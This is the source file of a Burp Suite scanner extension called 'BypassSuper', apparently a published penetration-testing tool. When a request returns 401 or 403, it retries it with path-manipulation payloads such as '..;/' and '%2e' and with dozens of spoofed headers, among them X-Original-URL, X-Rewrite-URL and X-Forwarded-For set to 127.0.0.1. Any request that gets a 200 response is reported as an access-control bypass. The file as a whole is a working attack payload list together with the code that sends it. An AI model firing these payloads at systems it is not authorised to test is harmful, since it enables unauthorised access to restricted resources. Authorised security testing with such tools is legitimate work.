from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from java.io import PrintWriter
import re
from array import array

class BurpExtender(IBurpExtender, IScannerCheck):

    #
    # implement IBurpExtender
    #

    def registerExtenderCallbacks(self, callbacks):
        # keep a reference to our callbacks object
        self._callbacks = callbacks

        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()

        # set our extension name
        callbacks.setExtensionName("BypassSuper")
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stderr = PrintWriter(callbacks.getStderr(), True)

        # register ourselves as a custom scanner check
        print("BypassSuper is loading ")
        print("Author: summersec")
        print("https://github.com/SummerSec/BypassSuper")
        callbacks.registerScannerCheck(self)

    # helper method to search a response for occurrences of a literal match string
    # and return a list of start/end offsets

    def _get_matches(self, sttcode):
        #response = self._helpers.bytesToString(response)
        if 400 <= sttcode:
            if sttcode < 404:
                return True
        return False

    def rplHeader(self, headerStr, headerName, newHeader):
        headerStr = re.sub('^'+headerName+':.*?$', newHeader, headerStr, flags=re.I|re.M)
        print("newHeader: " + newHeader)
        print("headerStr: " + headerStr)
        return headerStr

    
    def doPassiveScan(self, baseRequestResponse):
        
        # look for matches of our passive check grep string
        matches = self._get_matches(self._helpers.analyzeResponse(baseRequestResponse.getResponse()).getStatusCode())
        if matches == False:
            return None
        
        OldReq = self._helpers.bytesToString(baseRequestResponse.getRequest())
        OriginalUrl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath()
        HURl = str(self._helpers.analyzeRequest(baseRequestResponse).getUrl())
        Rurl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath()
        Upath = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath()
        print("OriginalUrl: "+OriginalUrl)
        if Rurl != "/":
            Rurl = self._helpers.analyzeRequest(baseRequestResponse).getUrl().getPath().rstrip("/")
        
        PreviousPath = '/'.join(str(Rurl).split('/')[:-1])
        LastPath = str(Rurl).split('/')[-1]

        print("PreviousPath: "+PreviousPath)
        print("LastPath: "+LastPath)
        
        print("Rurl: "+Rurl)
        print("Upath: "+Upath)
        
        
        self.stdout.println("Scanning: "+HURl)


        payloads = ["#"+LastPath,"/"+HURl,"%2e"+LastPath,"%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", "%20/"+LastPath,LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/" , LastPath+"?",LastPath+"??"
        ,"/"+LastPath+"//",LastPath+"/",LastPath+"/.randomstring",LastPath+".json"]
        # hpayloads = ["X-Rewrite-URL: "+OriginalUrl, "X-Original-URL: "+OriginalUrl,"Referer: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Forwarded-For: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Client-IP: 127.0.0.1","X-Host: 127.0.0.1","X-Forwared-Host: 127.0.0.1"]
        hpayloads = ["X-Original-URL: "+LastPath,"Content-Length: 0","X-Rewrite-URL: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1", "X-Original-URL: /"+LastPath, "Referer: "+ Rurl,"X-Host: 127.0.0.1","X-Client-IP: 127.0.0.1"
        ,"X-Forwarded-For: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Forwared-Host: 127.0.0.1","X-Remote-IP: 127.0.0.1","Referer: /"+LastPath,"Referer: "+HURl,"X-Http-Destinationurl: 127.0.0.1","X-Frame-Options: Allow"
        ,"Client-IP: 127.0.0.1","Proxy-Host: 127.0.0.1","Request-Uri: 127.0.0.1","X-Forwarded-By: 127.0.0.1","X-Forwarded: 127.0.0.1","X-Forwarded-For-Original: 127.0.0.1","X-Forwarded-Server: 127.0.0.1",
        "X-Forwarder-For: 127.0.0.1","X-Forward-For: 127.0.0.1","Base-Url: 127.0.0.1","Http-Url: 127.0.0.1","Proxy-Url: 127.0.0.1","Redirect: 127.0.0.1",
        "Real-Ip: 127.0.0.1","Referer: 127.0.0.1","Referrer: 127.0.0.1","Refferer: 127.0.0.1","Uri: 127.0.0.1","Url: 127.0.0.1","X-Http-Host-Override: 127.0.0.1","Url: "+Upath,"Url: "+HURl,"Uri: "+Upath,"Uri: "+HURl,
        "X-Original-Remote-Addr: 127.0.0.1","X-Original-Url: 127.0.0.1","X-Proxy-Url: 127.0.0.1","X-Rewrite-Url: 127.0.0.1","X-Real-Ip: 127.0.0.1",
        "X-Remote-Addr: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Proxy-Url: "+Upath,"Http-Url: "+Upath,"Proxy-Url: "+Upath,"Base-Url: "+Upath,"Proxy-Url: "+Upath]
        hspayloads = ["X-Rewrite-URL: "+Upath,"X-Original-URL: "+Upath, "X-Rewrite-URL: "+Upath,"X-Forwarded-Path: "+Upath,"Referer: "+HURl,"X-Proxy-Url: "+Upath,"Http-Url: "+Upath,"Proxy-Url: "+Upath,"Base-Url: "+Upath,"Proxy-Url: "+Upath,"Url: "+Upath,"Url: "+HURl,"Uri: "+Upath,"Uri: "+HURl]

        results = []

        for p in payloads:
            print("p: "+p)
            if HURl in p:
                NewReq = OldReq.replace(Rurl,p)
            else:
                NewReq = OldReq.replace(Rurl, PreviousPath+"/"+p)
            print(NewReq)
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))

            STT_CODE = self._helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode()
            if STT_CODE == 200:
                results.append("Url payload: "+self._helpers.analyzeRequest(checkRequestResponse).getUrl().getPath() + " | Status code: "+str(STT_CODE))
                
            

        for hp in hpayloads:
            print("hp: "+hp)
            if hp.startswith("X-Original-URL:"):
                NewReq = OldReq.replace(Rurl, Rurl+"4nyth1ng")
            if hp.startswith("Referer:") and "Referer:" in OldReq: #Replace header
                NewReq = self.rplHeader(OldReq, "Referer", hp)
            else: #Add header
                NewReq = OldReq.replace("User-Agent: ", hp+"\r\n"+"User-Agent: ")
            print(NewReq)
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))
            STT_CODE = self._helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode()
            if STT_CODE == 200:
                results.append("Header payload: "+hp + " | Status code: "+str(STT_CODE))


        for hsp in hspayloads:
            print("hsp: "+hsp)
            if hsp.startswith("Referer:") and "Referer:" in OldReq: #Replace header
                NewReq = self.rplHeader(OldReq, "Referer", hsp)
            else:
                NewReq = OldReq.replace(Rurl,"/").replace("User-Agent: ", hsp+"\r\n"+"User-Agent: ")
            print(NewReq)
            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), self._helpers.stringToBytes(NewReq))

            STT_CODE = self._helpers.analyzeResponse(checkRequestResponse.getResponse()).getStatusCode()
            if STT_CODE == 200:
                results.append("Header payload: "+hsp + " | Status code: "+str(STT_CODE))

        
        if len(results) == 0:
            return None

        return [CustomScanIssue(
            baseRequestResponse.getHttpService(),
            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
            [self._callbacks.applyMarkers(baseRequestResponse, None, None)],
            "403 or 401 Bypass Vuln by BypassSuper",
            '<br>'.join(results),
            "High")]
        
        

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        # This method is called when multiple issues are reported for the same URL 
        # path by the same extension-provided check. The value we return from this 
        # method determines how/whether Burp consolidates the multiple issues
        # to prevent duplication
        #
        # Since the issue name is sufficient to identify our issues as different,
        # if both issues have the same name, only report the existing issue
        # otherwise report both issues
        if existingIssue.getUrl() == newIssue.getUrl():
            return -1

        return 0

#
# class implementing IScanIssue to hold our custom scan issue details
#
class CustomScanIssue (IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        pass

    def getRemediationBackground(self):
        pass

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        pass

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
